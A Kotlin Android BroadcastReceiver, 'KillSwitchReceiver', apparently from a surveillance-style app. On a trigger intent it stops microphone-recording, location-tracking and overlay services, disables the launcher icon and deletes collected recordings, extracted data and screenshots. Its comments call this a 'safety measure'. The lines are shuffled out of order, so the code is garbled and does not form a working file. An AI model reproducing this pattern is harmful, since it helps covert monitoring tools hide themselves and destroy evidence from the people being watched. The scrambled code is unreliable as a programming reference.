package com.anti.rootadbcontroller.services

import android.content.pm.PackageManager
 * collected by the app. This is designed as a safety measure to ensure the app
        if (intent?.action == "com.anti.rootadbcontroller.KILL_SWITCH") {
            val componentName = ComponentName(context, MainActivity::class.java)
            context.stopService(Intent(context, MicRecorderService::class.java))
    }
    private fun safeCleanup(context: Context) {
            context.cacheDir?.let {
            context.externalCacheDir?.let {
            val databaseDir = File(context.applicationInfo.dataDir, "databases")
            }
        if (externalFilesDir != null && externalFilesDir.exists()) {
            fileOrDirectory.listFiles()?.forEach { deleteRecursively(it) }
}
import android.content.Intent
 * it disables the main activity, stops all running services, and cleans up any data

            val pm = context.packageManager
            // 3. Stop any running services
        }
     */
            // Clean up app's cache directory
            // Clean up app's external cache directory
            // Clear app's database files if needed
                Log.d(TAG, "Database files cleaned")
        val externalFilesDir = context.getExternalFilesDir(null)
        if (fileOrDirectory.isDirectory) {
    }
import android.content.Context
 * A BroadcastReceiver that acts as a kill switch for the application. When triggered,
        Log.d(TAG, "Kill switch triggered. Verifying and disabling app components.")
            // 2. Disable the main launcher activity

            Log.w(TAG, "Kill switch triggered with incorrect action: ${intent?.action}")
     * @param context The context from which the cleanup is initiated.



                }
    private fun cleanupExternalStorageFiles(context: Context) {
    private fun deleteRecursively(fileOrDirectory: File) {
        private const val TAG = "KillSwitchReceiver"
import android.content.ComponentName
/**
    override fun onReceive(context: Context, intent: Intent?) {

            )
        } else {
     * dangerous operations that could affect system stability.
            cleanupExternalStorageFiles(context)
            }
            }
                    }


    companion object {
import android.content.BroadcastReceiver


            safeCleanup(context)
                PackageManager.DONT_KILL_APP
            Log.d(TAG, "Kill switch procedures completed.")
     * This includes recordings, extracted data, and screenshots, but avoids
            // Clean up app-specific external storage files
                }
                }
                        file.delete()
    }
    }

import java.io.File
class KillSwitchReceiver : BroadcastReceiver() {
            // 1. Wipe collected data
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,

     * Safely cleans up files and directories created by the application.
        try {
                    Log.d(TAG, "Cache directory cleaned")
                    Log.d(TAG, "External cache directory cleaned")
                    if (!file.name.contains("essential")) { // Skip essential databases
        }
        }
    }
import com.anti.rootadbcontroller.MainActivity
 */

                componentName,
            context.stopService(Intent(context, OverlayService::class.java))
    /**

                    it.deleteRecursively()
                    it.deleteRecursively()
                databaseDir.listFiles()?.forEach { file ->
            Log.e(TAG, "Error during safe cleanup", e)
            Log.d(TAG, "External files directory cleaned")
        fileOrDirectory.delete()
import android.util.Log
 * does not remain active indefinitely.
            Log.d(TAG, "Kill switch verification passed. Proceeding with cleanup.")
            pm.setComponentEnabledSetting(
            context.stopService(Intent(context, LocationTrackerService::class.java))

        Log.d(TAG, "Safely cleaning up collected data...")
                if (it.exists()) {
                if (it.exists()) {
            if (databaseDir.exists()) {
        } catch (e: Exception) {
            deleteRecursively(externalFilesDir)
        }
